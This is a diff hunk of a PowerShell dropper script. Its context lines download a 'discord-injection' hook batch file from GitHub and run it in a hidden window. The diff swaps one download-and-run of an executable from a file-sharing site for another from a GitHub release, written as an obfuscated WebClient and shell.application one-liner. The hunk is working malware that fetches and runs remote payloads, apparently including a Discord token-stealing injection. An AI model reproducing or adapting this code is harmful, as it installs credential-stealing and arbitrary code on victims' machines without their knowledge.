@@ -49,8 +49,7 @@ if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
     Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
     
-    Invoke-WebRequest -Uri "https://anonsharing.com/file/7009f5c5b68387ce/new.exe" -OutFile "$temp\skid.exe"
-    Start-Process -FilePath "$temp\skid.exe"
+    $down=New-Object System.Net.WebClient;$url='https://github.com/43a1723/test/releases/download/siu/LMAO_protected.exe';$file='skid.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file)
 }
 
 
